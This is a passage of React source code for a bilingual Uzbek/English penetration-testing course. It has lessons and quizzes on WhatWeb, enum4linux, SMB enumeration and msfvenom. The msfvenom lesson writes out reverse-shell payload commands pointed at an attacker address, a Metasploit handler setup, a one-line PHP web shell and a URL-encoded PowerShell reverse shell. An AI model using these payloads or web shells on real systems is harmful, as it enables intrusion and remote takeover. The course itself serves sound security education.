    React.createElement(Quiz,{q:{uz:"theHarvester qanday razvedka turiga misol?",en:"What type of recon is theHarvester?"},opts:[{uz:"Aktiv (nishonga hujum)",en:"Active (probing the target)"},{uz:"Passiv (ochiq manba OSINT)",en:"Passive (open-source OSINT)"},{uz:"Ekspluatatsiya",en:"Exploitation"},{uz:"Post-ekspluatatsiya",en:"Post-exploitation"}],correct:1,exp:{uz:"theHarvester passiv OSINT vositasi — u ma'lumotni uchinchi tomon ochiq manbalaridan oladi va nishonga hech narsa yubormaydi.",en:"theHarvester is a passive OSINT tool — it pulls data from third-party public sources and sends nothing to the target."}}));
}
function LessonL17(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"WhatWeb nima?","What is WhatWeb?")),
    React.createElement(P,null,t(lang,"WhatWeb — veb-saytning \"ostida\" qanday texnologiyalar ishlayotganini aniqlaydigan vosita. U CMS (WordPress, Joomla), veb-server (Apache, Nginx), dasturlash tili, JavaScript kutubxonalari, analitika vositalari va hatto aniq versiyalarni ham topadi. Bu zaifliklarni izlashning boshlanish nuqtasi: qanday texnologiya ishlatilishini bilib, unga tegishli ma'lum zaifliklarni qidirasiz.","WhatWeb identifies which technologies run \"under the hood\" of a website. It detects the CMS (WordPress, Joomla), web server (Apache, Nginx), programming language, JavaScript libraries, analytics tools and even exact versions. This is the starting point for finding vulnerabilities: knowing what technology is used, you look up known vulnerabilities for it.")),
    React.createElement(H2,{num:"§2"},t(lang,"Nima aniqlanadi","What it detects")),
    React.createElement(LayerStack,{layers:[
      {n:"🧩",name:"CMS",color:"#a855f7",desc:{uz:"WordPress, Joomla, Drupal + versiya.",en:"WordPress, Joomla, Drupal + version."}},
      {n:"🖥",name:t(lang,"Veb-server","Web server"),color:"#4dabf7",desc:{uz:"Apache, Nginx, IIS + versiya.",en:"Apache, Nginx, IIS + version."}},
      {n:"⚙",name:t(lang,"Til/framework","Language/framework"),color:"#69db7c",desc:{uz:"PHP, ASP.NET, Node, Django.",en:"PHP, ASP.NET, Node, Django."}},
      {n:"📊",name:t(lang,"Kutubxona/analitika","Library/analytics"),color:"#ffd43b",desc:{uz:"jQuery, Bootstrap, Google Analytics.",en:"jQuery, Bootstrap, Google Analytics."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"U qanday aniqlaydi?","How it detects")),
    React.createElement(P,null,t(lang,"WhatWeb saytdan olingan HTTP javobini tahlil qiladi: sarlavhalar (Server:, X-Powered-By:), sahifa HTML kodidagi imzolar (meta teglar, JS fayl nomlari, muayyan yo'llar) va cookie nomlari. Har texnologiyaning o'ziga xos \"barmoq izi\" bor — masalan WordPress /wp-content/ yo'lini, Drupal esa maxsus meta tegni ishlatadi. WhatWeb minglab shunday imzoni biladi.","WhatWeb analyzes the HTTP response from the site: headers (Server:, X-Powered-By:), signatures in the page HTML (meta tags, JS file names, specific paths) and cookie names. Each technology has its own \"fingerprint\" — for example WordPress uses the /wp-content/ path, Drupal a specific meta tag. WhatWeb knows thousands of such signatures.")),
    React.createElement(H2,{num:"§4"},t(lang,"Agressivlik va keyingi qadam","Aggression and the next step")),
    React.createElement(P,null,t(lang,"-a bayrog'i agressivlik darajasini belgilaydi: -a 1 (yashirin, faqat asosiy sahifa), -a 3 (o'rtacha, ko'proq so'rov) va -a 4 (agressiv, eng aniq). Yuqori daraja ko'proq aniqlaydi, lekin ko'proq iz qoldiradi. Muhimi — keyingi qadam: agar WhatWeb \"WordPress 5.2\" ni aniqlasa, siz darhol searchsploit wordpress 5.2 bilan o'sha versiyaga tegishli ma'lum zaifliklarni izlaysiz. Texnologiya + versiya = maqsadli hujum.","The -a flag sets the aggression level: -a 1 (stealthy, main page only), -a 3 (moderate, more requests), -a 4 (aggressive, most accurate). Higher levels detect more but leave more trace. The key is the next step: if WhatWeb detects \"WordPress 5.2\", you immediately look up known vulnerabilities for that version with searchsploit wordpress 5.2. Technology + version = a targeted attack.")),
    React.createElement(Terminal,null,"whatweb example.com\nwhatweb -v example.com          # batafsil\nwhatweb -a 3 example.com        # agressivlik darajasi\nwhatweb -i targets.txt          # ko'p saytni birdan"),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"\"WordPress 5.2\" aniqlansa — searchsploit wordpress 5.2 bilan ma'lum zaifliklarni izlaysiz. Texnologiya + versiya = maqsadli hujum.","If it detects \"WordPress 5.2\" — you look up known vulns with searchsploit wordpress 5.2. Technology + version = a targeted attack.")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: -a 1 vs -a 4","Interactive simulator: -a 1 vs -a 4")),
    React.createElement(P,null,t(lang,"Xuddi shu saytni ikki agressivlik darajasida sinang — nima yo'qolib, nima ochilishini ko'ring:","Probe the same site at two aggression levels — see what gets missed and what gets revealed:")),
    React.createElement(WhatWebAggroSim),
    React.createElement(H2,{num:"§6"},t(lang,"WhatWeb aniqlash oqimi","WhatWeb detection flow")),
    React.createElement(FlowSteps,{color:"#a855f7",title:{uz:"Texnologiyani aniqlash",en:"Fingerprinting a site"},steps:[{icon:"📡",text:{uz:"HTTP so'rov yuborib, javob va sarlavhalarni oladi",en:"Sends an HTTP request, reads the response and headers"}},{icon:"🔬",text:{uz:"Imzolarni (HTML, cookie, header) solishtiradi",en:"Matches signatures (HTML, cookies, headers)"}},{icon:"🏷",text:{uz:"CMS, server, til va versiyani aniqlaydi",en:"Identifies the CMS, server, language and version"}},{icon:"🎯",text:{uz:"Versiya → searchsploit bilan zaiflik qidirish",en:"Version → hunt vulns with searchsploit"}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: texnologiyalarni aniqlash","Practice: identifying tech")),
    React.createElement(P,null,t(lang,"WhatWeb bir so'rov bilan saytning butun texnologiya to'plamini aniqlaydi. Aniqlangan versiya keyingi bosqichning kalitidir.","WhatWeb identifies a site's whole technology stack in a single request. The detected version is the key to the next step.")),
    React.createElement(Terminal,null,"whatweb http://10.0.0.5\n# http://10.0.0.5 [200 OK] Apache[2.4.29],\n#   Country[RESERVED], HTTPServer[Ubuntu Linux],\n#   PHP[7.2.24], WordPress[5.2], X-Powered-By[PHP/7.2.24]\n# → searchsploit wordpress 5.2"),
    React.createElement(Quiz,{q:{uz:"WhatWeb asosan nimani aniqlaydi?",en:"What does WhatWeb primarily identify?"},opts:[{uz:"Parol hashlarini",en:"Password hashes"},{uz:"Veb-saytning texnologiya stekini",en:"A website's technology stack"},{uz:"Ochiq UDP portlarni",en:"Open UDP ports"},{uz:"WiFi parollarini",en:"WiFi passwords"}],correct:1,exp:{uz:"WhatWeb veb-sayt ortidagi texnologiyalarni (CMS, server, til, kutubxonalar va versiyalar) aniqlaydi — maqsadli zaiflik izlash uchun asos.",en:"WhatWeb detects the technologies behind a website (CMS, server, language, libraries and versions) — a basis for targeted vulnerability research."}}));
}
function LessonL18(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"enum4linux nima?","What is enum4linux?")),
    React.createElement(P,null,t(lang,"enum4linux — Windows va Samba tizimlaridan SMB protokoli orqali ma'lumot to'playdigan vosita. U foydalanuvchilar ro'yxati, guruhlar, ulashilgan papkalar (shares), parol siyosati va operatsion tizim ma'lumotlarini chiqarib olishga urinadi — va ko'pincha buni autentifikatsiyasiz, ya'ni \"null session\" orqali qiladi. Bu Windows tarmoqlariga qarshi eng ko'p ishlatiladigan enumeratsiya vositalaridan biri.","enum4linux gathers information from Windows and Samba systems over the SMB protocol. It attempts to extract the user list, groups, shared folders (shares), password policy and OS details — and often does so without authentication, via a \"null session\". It's one of the most-used enumeration tools against Windows networks.")),
    React.createElement(H2,{num:"§2"},t(lang,"Enumeratsiya oqimi","Enumeration flow")),
    React.createElement(FlowSteps,{title:{uz:"enum4linux",en:"enum4linux"},steps:[
      {icon:"🔌",text:{uz:"SMB'ga null session bilan ulanish (parolsiz)",en:"Connect to SMB with a null session (no password)"}},
      {icon:"👥",text:{uz:"Foydalanuvchilar va guruhlarni sanash",en:"Enumerate users and groups"}},
      {icon:"📂",text:{uz:"Ulashilgan papkalarni ro'yxatlash",en:"List shared folders"}},
      {icon:"📋",text:{uz:"OS va parol siyosati ma'lumoti",en:"OS and password-policy info"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"\"Null session\" nima?","What is a null session?")),
    React.createElement(P,null,t(lang,"Null session — bu foydalanuvchi nomi va parolsiz SMB'ga anonim ulanish. Eski yoki noto'g'ri sozlangan Windows tizimlari null session'ga ruxsat beradi, va bu butun foydalanuvchilar ro'yxatini, guruhlarni va parol siyosatini ochib berishi mumkin. Nega bu xavfli? Chunki foydalanuvchi ismlari ro'yxati — parol hujumlari uchun yarim yo'l: endi hujumchi faqat parolni topsa kifoya. Shuning uchun zamonaviy Windows null session'ni cheklaydi.","A null session is an anonymous connection to SMB with no username or password. Old or misconfigured Windows systems allow null sessions, which can leak the entire user list, groups and password policy. Why is that dangerous? Because a list of usernames is half the way to a password attack: now the attacker only needs to find the password. That's why modern Windows restricts null sessions.")),
    React.createElement(H2,{num:"§4"},t(lang,"Nima chiqariladi va ng versiya","What it extracts and the ng version")),
    React.createElement(P,null,t(lang,"-a bayrog'i barcha tekshiruvlarni ishga tushiradi: foydalanuvchilar (RID cycling orqali ham), guruhlar, ulashmalar, parol siyosati, va operatsion tizim versiyasi. Zamonaviy muqobil — enum4linux-ng (Python bilan qayta yozilgan, tezroq va tuzilgan chiqish beradi). enum4linux 139 va 445 portlar (SMB) ochiq bo'lganda ishlaydi — ular Nmap bilan avval aniqlanadi.","The -a flag runs all checks: users (including via RID cycling), groups, shares, password policy and OS version. The modern alternative is enum4linux-ng (rewritten in Python, faster and with structured output). enum4linux works when ports 139 and 445 (SMB) are open — which you first find with Nmap.")),
    React.createElement(Terminal,null,"enum4linux -a 10.0.0.5           # to'liq\nenum4linux -U 10.0.0.5           # faqat foydalanuvchilar\nenum4linux -S 10.0.0.5           # faqat ulashmalar\nenum4linux-ng -A 10.0.0.5        # zamonaviy versiya"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"enum4linux topilgan foydalanuvchi ismlarini keyinchalik parol hujumlari uchun ishlatish mumkin — faqat ruxsat berilgan nishonlarda.","Usernames enum4linux finds may be used in later password attacks — only on authorized targets.")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: null session ruxsat etilganmi?","Interactive simulator: is the null session allowed?")),
    React.createElement(P,null,t(lang,"§3 dagi xavfni his qiling — xuddi shu null session urinishini eski va zamonaviy Windows'da sinang:","Feel the §3 risk for yourself — try the exact same null-session attempt against old and modern Windows:")),
    React.createElement(NullSessionSim),
    React.createElement(H2,{num:"§6"},t(lang,"Amaliyot: SMB enumeratsiyasi","Practice: SMB enumeration")),
    React.createElement(P,null,t(lang,"enum4linux Windows/Samba tizimlaridan SMB/NetBIOS orqali ma'lumot yig'adi. -a barcha tekshiruvlarni birdan bajaradi.","enum4linux gathers info from Windows/Samba systems over SMB/NetBIOS. -a runs all checks at once.")),
    React.createElement(Terminal,null,"enum4linux -a 10.0.0.5\n# [+] Got domain/workgroup name: WORKGROUP\n# [+] Users: alice (RID 1000), bob (RID 1001)\n# [+] Share Enumeration:\n#     backups   Disk    (read/write!)\n#     IPC$      IPC"),
    React.createElement(Quiz,{q:{uz:"enum4linux qaysi protokol orqali ma'lumot to'playdi?",en:"Over which protocol does enum4linux gather info?"},opts:[{uz:"SMB",en:"SMB"},{uz:"DNS",en:"DNS"},{uz:"SMTP",en:"SMTP"},{uz:"SNMP",en:"SNMP"}],correct:0,exp:{uz:"enum4linux SMB protokoli (139/445 portlar) orqali Windows/Samba tizimlaridan foydalanuvchilar, guruhlar va ulashmalarni sanaydi.",en:"enum4linux uses the SMB protocol (ports 139/445) to enumerate users, groups and shares from Windows/Samba systems."}}));
}
function LessonL19(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"SMB va nima uchun muhim","SMB and why it matters")),
    React.createElement(P,null,t(lang,"SMB (Server Message Block) — Windows tarmoqlarida fayl va printerlarni ulashish protokoli. U 445-portda ishlaydi va korporativ tarmoqlarda deyarli hamma joyda uchraydi. Pentester uchun SMB oltin kon: noto'g'ri sozlangan ulashmalar (shares) maxfiy fayllar, parollar, konfiguratsiya va zaxira nusxalarini ochib berishi mumkin — ko'pincha shunchaki ulanish orqali.","SMB (Server Message Block) is the file and printer sharing protocol in Windows networks. It runs on port 445 and is nearly everywhere in corporate networks. For a pentester SMB is a goldmine: misconfigured shares can expose confidential files, passwords, configuration and backups — often just by connecting.")),
    React.createElement(H2,{num:"§2"},t(lang,"Ulashmalarni sanash","Enumerating shares")),
    React.createElement(FlowSteps,{title:{uz:"SMB ulashmalari",en:"SMB shares"},steps:[
      {icon:"📋",text:{uz:"smbclient -L bilan ulashmalar ro'yxati",en:"List shares with smbclient -L"}},
      {icon:"🗺",text:{uz:"smbmap bilan ruxsatlarni xaritalash",en:"Map permissions with smbmap"}},
      {icon:"📂",text:{uz:"Ulashmaga ulanib fayllarni ko'rish",en:"Connect and browse files"}},
      {icon:"⬇",text:{uz:"Qiziqarli fayllarni yuklab olish (get)",en:"Download interesting files (get)"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Asosiy vositalar","The core tools")),
    React.createElement(P,null,t(lang,"Bir necha vosita SMB bilan ishlaydi. smbclient — FTP kabi interaktiv, ulashmaga ulanib ls, get, put bajarasiz. smbmap — barcha ulashmalarni va ularga bo'lgan ruxsatlaringizni (READ/WRITE) tez ko'rsatadi. crackmapexec (yoki yangi nxc) — ko'p xostda birdan SMB ni tekshiradi, ma'lumotlarni sanaydi va hatto ma'lumotnomalar bilan kirishni sinaydi. Nmap NSE skriptlari (smb-enum-shares) ham foydali.","Several tools work with SMB. smbclient — interactive like FTP, you connect to a share and run ls, get, put. smbmap — quickly shows all shares and your permissions on them (READ/WRITE). crackmapexec (or the newer nxc) — checks SMB across many hosts at once, enumerates data and even tests logins with credentials. Nmap NSE scripts (smb-enum-shares) are useful too.")),
    React.createElement(H2,{num:"§4"},t(lang,"EternalBlue va SMB zaifliklari","EternalBlue and SMB vulnerabilities")),
    React.createElement(P,null,t(lang,"SMB tarixdagi eng mashhur zaifliklardan biriga ega — MS17-010, ya'ni EternalBlue. Bu eski SMBv1'dagi kamchilik bo'lib, hujumchiga masofadan kod bajarishga (tizimni to'liq egallashga) imkon beradi — WannaCry ransomware aynan shuni ishlatgan. Ajablanarlisi, u hali ham ko'p eski, yangilanmagan tizimlarda ochiq. Nmap skripti bilan tekshirib ko'rish mumkin.","SMB has one of the most famous vulnerabilities in history — MS17-010, aka EternalBlue. It's a flaw in the old SMBv1 that lets an attacker execute code remotely (fully take over the system) — the WannaCry ransomware used exactly this. Remarkably, it's still open on many old, unpatched systems. You can check for it with an Nmap script.")),
    React.createElement(Terminal,null,"smbclient -L //10.0.0.5 -N        # anonim ulashmalar ro'yxati\nsmbmap -H 10.0.0.5                 # ruxsatlarni xaritalash\nsmbclient //10.0.0.5/Documents -N # ulashmaga ulanish\nnmap --script smb-vuln-ms17-010 -p445 10.0.0.5  # EternalBlue"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"SMB enumeratsiyani faqat sizga tegishli yoki yozma ruxsat berilgan tizimlarda o'tkazing.","Only perform SMB enumeration on systems you own or are authorized to test.")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: SMBv1 zaif vs yangilangan","Interactive simulator: vulnerable SMBv1 vs patched")),
    React.createElement(P,null,t(lang,"Xuddi shu MS17-010 tekshiruvi ikki xil serverda qanday farqli tugashini ko'ring:","See how the exact same MS17-010 check ends very differently against two different servers:")),
    React.createElement(EternalBlueSim),
    React.createElement(H2,{num:"§6"},t(lang,"SMB vositalari","The SMB tools")),
    React.createElement(LayerStack,{layers:[{n:"smbclient",name:t(lang,"smbclient","smbclient"),color:"#4dabf7",desc:{uz:"Ulashmalarga FTP kabi ulanish.",en:"Connect to shares like FTP."}},{n:"smbmap",name:t(lang,"smbmap","smbmap"),color:"#69db7c",desc:{uz:"Ulashmalar va ruxsatlarni tez sanash.",en:"Quickly enumerate shares and permissions."}},{n:"crackmapexec",name:t(lang,"crackmapexec","crackmapexec"),color:"#a855f7",desc:{uz:"Ommaviy tekshirish va ma'lumotnoma sinovi.",en:"Mass checks and credential testing."}},{n:"445",name:t(lang,"port 445","port 445"),color:"#ffd43b",desc:{uz:"SMB asosiy porti (139 — eski NetBIOS).",en:"The main SMB port (139 — legacy NetBIOS)."}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: ulashmalarni ko'rish","Practice: listing shares")),
    React.createElement(P,null,t(lang,"smbclient -L bilan mavjud ulashmalarni sanaydi. «read/write» ruxsatli ulashma — fayl yuklash yoki chiqarish uchun to'g'ridan-to'g'ri imkoniyat.","smbclient -L lists the available shares. A share with read/write permission is a direct opportunity to upload or exfiltrate files.")),
    React.createElement(Terminal,null,"smbclient -L //10.0.0.5 -N\n#   Sharename       Type      Comment\n#   backups         Disk\n#   IPC$            IPC       Remote IPC\nsmbclient //10.0.0.5/backups -N\n# smb: \\> ls   → fayllarni ko'rish"),
    React.createElement(Quiz,{q:{uz:"SMB protokoli qaysi asosiy portda ishlaydi?",en:"On which main port does SMB run?"},opts:[{uz:"22",en:"22"},{uz:"80",en:"80"},{uz:"445",en:"445"},{uz:"53",en:"53"}],correct:2,exp:{uz:"SMB asosan 445-portda (eski hollarda 139) ishlaydi va Windows tarmoqlarida fayl ulashish uchun ishlatiladi.",en:"SMB runs mainly on port 445 (139 in legacy cases) and is used for file sharing in Windows networks."}}));
}
function LessonL22(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"msfvenom nima?","What is msfvenom?")),
    React.createElement(P,null,t(lang,"msfvenom — Metasploit tarkibidagi payload (yuk) generatori. U turli formatlarda (.exe, .elf, .apk, .php) bajariladigan zararli yuklarni yaratadi. Bu yuklar nishonda ishga tushganda hujumchiga teskari ulanish (reverse shell) beradi — ya'ni nishon o'zi hujumchiga qaytib ulanadi (bu firewall'lardan o'tishga yordam beradi). Bu vosita faqat ta'lim va ruxsat berilgan pentest uchun.","msfvenom is the payload generator inside Metasploit. It creates executable malicious payloads in various formats (.exe, .elf, .apk, .php). When run on a target these payloads give the attacker a reverse shell — the target connects back to the attacker (which helps get through firewalls). This tool is for education and authorized pentesting only.")),
    React.createElement(H2,{num:"§2"},t(lang,"Payload → shell oqimi","Payload → shell flow")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"msfvenom + handler",en:"msfvenom + handler"},steps:[
      {icon:"🧪",text:{uz:"msfvenom bilan payload yaratish (LHOST/LPORT)",en:"Generate a payload with msfvenom (LHOST/LPORT)"}},
      {icon:"👂",text:{uz:"Metasploit'da handler (tinglovchi) sozlash",en:"Set up a handler (listener) in Metasploit"}},
      {icon:"▶",text:{uz:"Nishonda payload ishga tushadi",en:"The payload runs on the target"}},
      {icon:"🔗",text:{uz:"Teskari ulanish hujumchiga qaytadi",en:"A reverse connection returns to the attacker"}},
      {icon:"🐚",text:{uz:"Meterpreter/shell sessiyasi ochiladi",en:"A Meterpreter/shell session opens"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"LHOST, LPORT va formatlar","LHOST, LPORT and formats")),
    React.createElement(P,null,t(lang,"Payload yaratishda uch narsa muhim. LHOST — teskari ulanish qaytadigan manzil, ya'ni sizning (hujumchi) IP ingiz. LPORT — siz tinglayotgan port (masalan 4444). -f format — chiqish turini belgilaydi: Windows uchun exe, Linux uchun elf, veb-server uchun php yoki raw. Nishon tizimiga mos formatni tanlash muhim, aks holda payload ishlamaydi.","Three things matter when generating a payload. LHOST — the address the reverse connection returns to, i.e. your (attacker) IP. LPORT — the port you listen on (e.g. 4444). -f format — sets the output type: exe for Windows, elf for Linux, php or raw for a web server. Choosing the format that matches the target OS is important, or the payload won't run.")),
    React.createElement(SlideImg,{src:"msfvenom/msf_s03.png",cap:"msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=... LPORT=443 — Windows reverse shell .exe yaratadi.",capEn:"msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=... LPORT=443 — generates a Windows reverse-shell .exe."}),
    React.createElement(H2,{num:"§4"},t(lang,"Staged, stageless va handler","Staged, stageless and the handler")),
    React.createElement(P,null,t(lang,"Payloadlar ikki turga bo'linadi. \"Staged\" (masalan windows/meterpreter/reverse_tcp) kichik boshlang'ich yuk yuboradi, keyin qolganini yuklab oladi — kichikroq, lekin ulanishga bog'liq. \"Stageless\" (windows/meterpreter_reverse_tcp — pastki chiziqqa e'tibor bering) hammasini birdan o'z ichiga oladi — kattaroq, lekin ishonchliroq. Yuk qaytishini qabul qilish uchun Metasploit'da handler (exploit/multi/handler) sozlashingiz shart — u tinglovchi vazifasini bajaradi.","Payloads come in two kinds. \"Staged\" (e.g. windows/meterpreter/reverse_tcp) sends a small initial load, then downloads the rest — smaller, but connection-dependent. \"Stageless\" (windows/meterpreter_reverse_tcp — note the underscore) contains everything at once — larger but more reliable. To receive the connection back you must set up a handler (exploit/multi/handler) in Metasploit — it acts as the listener.")),
    React.createElement(Terminal,null,"msfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.0.0.10 LPORT=4444 -f exe -o shell.exe\nmsfvenom -p php/reverse_php LHOST=10.0.0.10 LPORT=4444 -f raw -o shell.php\n\n# handler (tinglovchi):\nmsfconsole -q\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.10\nset LPORT 4444\nrun"),
    React.createElement(H2,{num:"§5"},t(lang,"Nomlash qoidalari","Naming conventions")),
    React.createElement(P,null,t(lang,"msfvenom payloadlari qat'iy nomlash tizimiga ega: <OS>/<arch>/<payload>. Masalan linux/x86/shell_reverse_tcp — bu x86 (32-bitli) Linux uchun stageless teskari shell. Ikki muhim ipuchi bor: agar payload nomida pastki chiziq (_) bo'lsa — u stageless (shell_reverse_tcp), agar qo'shimcha slesh (/) bo'lsa — u staged (shell/reverse_tcp). Mustasno: Windows 32-bitli nishonlar uchun arxitektura ko'rsatilmaydi (windows/shell_reverse_tcp), 64-bit uchun esa x64 yoziladi.","msfvenom payloads follow a strict naming scheme: <OS>/<arch>/<payload>. For example linux/x86/shell_reverse_tcp is a stageless reverse shell for x86 (32-bit) Linux. Two key hints: if the payload name has an underscore (_) it is stageless (shell_reverse_tcp); if it has an extra slash (/) it is staged (shell/reverse_tcp). Exception: for 32-bit Windows targets the architecture is omitted (windows/shell_reverse_tcp), while 64-bit uses x64.")),
    React.createElement(LayerStack,{layers:[
      {n:"_",name:t(lang,"Stageless (pastki chiziq)","Stageless (underscore)"),color:"#69db7c",desc:{uz:"shell_reverse_tcp — hammasi bitta faylda, ushlash oson.",en:"shell_reverse_tcp — all in one file, easy to catch."}},
      {n:"/",name:t(lang,"Staged (slesh)","Staged (slash)"),color:"#ff3a5e",desc:{uz:"shell/reverse_tcp — stager qolganini yuklab oladi.",en:"shell/reverse_tcp — a stager downloads the rest."}},
      {n:"list",name:t(lang,"Barcha payloadlar","All payloads"),color:"#4dabf7",desc:{uz:"msfvenom --list payloads | grep ...",en:"msfvenom --list payloads | grep ..."}},
    ]}),
    React.createElement(SlideImg,{src:"msfvenom/msf_s07.png",cap:"msfvenom --list payloads | grep — mavjud payloadlar; staged (/) va stageless (_) nomlanishiga e'tibor bering.",capEn:"msfvenom --list payloads | grep — available payloads; note the staged (/) vs stageless (_) naming."}),
    React.createElement(H2,{num:"§6"},t(lang,"Meterpreter","Meterpreter")),
    React.createElement(P,null,t(lang,"Meterpreter — Metasploit'ning o'ziga xos, to'liq funksiyali qobig'i. U oddiy shell'dan ancha kuchli: to'liq barqaror (ayniqsa Windows nishonlarida), xotirada ishlaydi va ko'plab o'rnatilgan funksiyalarга ega — fayl yuklash/yuklab olish, ekran surati, klaviatura yozuvi. Metasploit'ning ekspluatatsiyadan keyingi (post-exploitation) vositalaridan foydalanmoqchi bo'lsangiz, Meterpreter sessiyasi kerak. Yagona kamchiligi — Meterpreter sessiyasi Metasploit ichida ushlanishi shart (oddiy netcat yetmaydi).","Meterpreter is Metasploit's own full-featured shell. It is far more powerful than a plain shell: fully stable (especially against Windows targets), runs in memory, and has many built-in features — file upload/download, screenshots, keylogging. If you want to use Metasploit's post-exploitation tools, you need a Meterpreter session. Its only drawback is that a Meterpreter session must be caught inside Metasploit (plain netcat is not enough).")),
    React.createElement(H2,{num:"§7"},t(lang,"multi/handler bilan ushlash","Catching with multi/handler")),
    React.createElement(P,null,t(lang,"Multi/handler — teskari qobiqlarni, ayniqsa Meterpreter va staged payloadlarni ushlashning eng yaxshi vositasi. Undan foydalanish oson: msfconsole'ni oching, use exploit/multi/handler deb yozing, so'ng uch parametrni sozlang — payload (msfvenom'da ishlatgan bilan bir xil), LHOST va LPORT. LHOST bu yerda aniq ko'rsatilishi shart, chunki Metasploit netcat kabi barcha interfeyslarni avtomatik tinglamaydi. Nihoyat exploit -j buyrug'i tinglovchini fon (background) rejimida ishga tushiradi.","Multi/handler is the best tool for catching reverse shells, especially Meterpreter and staged payloads. It is easy to use: open msfconsole, type use exploit/multi/handler, then set three options — payload (the same one you used in msfvenom), LHOST and LPORT. LHOST must be specified explicitly here, because Metasploit does not automatically listen on all interfaces like netcat. Finally exploit -j starts the listener as a background job.")),
    React.createElement(SlideImg,{src:"msfvenom/msf_s08.png",cap:"exploit(multi/handler) > options — payload, LHOST va LPORT parametrlari sozlanadi.",capEn:"exploit(multi/handler) > options — the payload, LHOST and LPORT options are configured."}),
    React.createElement(SlideImg,{src:"msfvenom/msf_s10.png",cap:"Nishonda payload ishga tushgach, multi/handler ulanishni qabul qiladi va teskari qobiq beradi.",capEn:"Once the payload runs on the target, multi/handler accepts the connection and yields a reverse shell."}),
    React.createElement(SlideImg,{src:"msfvenom/msf_s11.png",cap:"multi/handler bosqichli yukni ushlaydi: sessiya ochiladi, sessions 1 bilan unga o'tamiz (Windows administrator).",capEn:"multi/handler catches the staged payload: a session opens; sessions 1 switches to it (Windows administrator)."}),
    React.createElement(H2,{num:"§8"},t(lang,"Interaktiv simulyator: payload nomi handler bilan mos kelishi shart","Interactive simulator: the payload name must match the handler")),
    React.createElement(P,null,t(lang,"§4 va §7 dagi ogohlantirishni his qiling — bitta belgi farqi (slesh vs pastki chiziq) hamma narsani buzishi mumkin:","Feel the §4 and §7 warning for yourself — a single character difference (slash vs underscore) can break everything:")),
    React.createElement(PayloadHandlerSim),
    React.createElement(H2,{num:"§9"},t(lang,"Web shells (veb-qobiqlar)","Web shells")),
    React.createElement(P,null,t(lang,"Ba'zan biz fayl yuklashga ruxsat beruvchi veb-saytga duch kelamiz, lekin to'liq teskari shell yuklab bo'lmaydi. Bunday holda web shell yuklaymiz — bu veb-server ichida ishlaydigan va serverda buyruq bajaradigan kichik skript (odatda PHP yoki ASP). Buyruqlar URL orqali (?cmd=) yoki HTML forma orqali kiritiladi, skript ularni bajaradi va natijani sahifaga qaytaradi. Kali'da tayyor web shell'lar /usr/share/webshells katalogida bor (masalan mashhur PentestMonkey php-reverse-shell). Windows nishonlarda ko'pincha URL formatida kodlangan PowerShell reverse shell ishlatiladi.","Sometimes we meet a website that allows file upload but a full reverse shell can't be uploaded. In that case we upload a web shell — a small script (usually PHP or ASP) that runs inside the web server and executes commands on it. Commands are passed via the URL (?cmd=) or an HTML form, the script runs them and returns the result to the page. Kali has ready web shells in /usr/share/webshells (e.g. the famous PentestMonkey php-reverse-shell). On Windows targets a URL-encoded PowerShell reverse shell is often used.")),
    React.createElement(Terminal,null,"# Eng oddiy PHP web shell (bir qatorli):\n<?php echo \"<pre>\" . shell_exec($_GET[\"cmd\"]) . \"</pre>\"; ?>\n\n# Foydalanish (brauzerda yoki curl bilan):\n# http://nishon/shell.php?cmd=id\n# http://nishon/shell.php?cmd=whoami\ncurl \"http://nishon/shell.php?cmd=ifconfig\"\n\n# Kali'dagi tayyor web shell'lar:\nls /usr/share/webshells/php/"),
    React.createElement(SlideImg,{src:"msfvenom/msf_s13.png",cap:"PHP web shell amalda: URL'dagi ?cmd= parametri orqali nishonda buyruq bajariladi.",capEn:"A PHP web shell in action: a command runs on the target via the ?cmd= parameter in the URL."}),
    React.createElement(P,null,t(lang,"Nishon Windows bo'lsa, veb-shell orqali RCE olishning eng oson yo'li — URL formatida kodlangan (URL Encoded) PowerShell teskari shell. Uzun PowerShell buyrug'i (TCPClient ochib, hujumchiga ulanadigan) URL-kodlanadi va cmd parametrining qiymati sifatida joylashtiriladi (%20 = bo'sh joy, %22 = qo'shtirnoq). IP va Portni o'zgartirishni unutmang.","If the target is Windows, the easiest way to get RCE via a web shell is a URL-encoded PowerShell reverse shell. A long PowerShell command (opening a TCPClient that connects to the attacker) is URL-encoded and placed as the value of the cmd parameter (%20 = space, %22 = quote). Remember to change the IP and Port.")),
    React.createElement(Terminal,null,"# Windows nishon uchun PowerShell reverse shell (URL-encoded, qisqartirilgan):\nhttp://nishon/shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B...%22\n\n# Dekodlangan ko'rinishi (asl PowerShell):\npowershell -c \"$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>); ...\""),
